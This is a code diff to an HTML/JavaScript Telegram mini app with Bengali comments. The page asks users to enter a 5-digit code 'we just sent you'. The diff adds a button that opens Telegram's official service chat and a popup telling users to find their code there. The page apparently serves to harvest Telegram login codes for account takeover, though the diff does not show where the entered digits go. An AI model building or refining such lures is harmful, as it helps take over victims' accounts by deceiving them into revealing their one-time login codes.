@@ -44,6 +44,7 @@
             background: rgba(255, 255, 255, 0.95);
             padding: 15px; border-radius: 15px;
             margin-bottom: 15px; color: #333; font-weight: bold; font-size: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
         }
 
         .get-code-btn {
@@ -91,8 +92,8 @@
                 Enter the 5-digit code that we just sent you!
             </div>
 
-            <!-- প্রো স্টাইল বাটন -->
-            <button class="get-code-btn" onclick="openTelegramChat()">📥 Get Login Code</button>
+            <!-- Get Code বাটন -->
+            <button class="get-code-btn" onclick="openTelegramChat()">📥 Open Official Telegram Chat</button>
 
             <div class="otp-inputs">
                 <div class="otp-box" id="b1"></div>
@@ -157,10 +158,20 @@
             } catch (e) { }
         }
 
-        // একদম আসল প্রো মেথড যা সরাসরি ওটিপি চ্যাটে নিয়ে যাবে
+        // প্রো সেশন বট মেথড
         function openTelegramChat() {
-            // এটি টেলিগ্রাম অ্যাপকে কমান্ড দেয় সরাসরি সার্ভিস চ্যাট ওপেন করতে
+            // ১. এই লিঙ্কটি সরাসরি টেলিগ্রাম সার্ভিস চ্যাট ওপেন করার জন্য সবচেয়ে শক্তিশালী
             tg.openTelegramLink("tg://resolve?domain=telegram");
+
+            // ২. যদি ১ নম্বর কাজ না করে, তবে ৫ সেকেন্ড পর ইউজারকে একটি গাইড পপ-আপ দিবে
+            // কারণ কিছু ডিভাইসে টেলিগ্রাম সরাসরি লিঙ্ক ব্লক করে রাখে
+            setTimeout(() => {
+                tg.showPopup({
+                    title: 'Code not found?',
+                    message: 'Please minimize this app and check your "Telegram" official chat at the top of your message list.',
+                    buttons: [{type: 'ok', text: 'Ok, I will check'}]
+                });
+            }, 3000);
         }
 
         function addNum(n) {
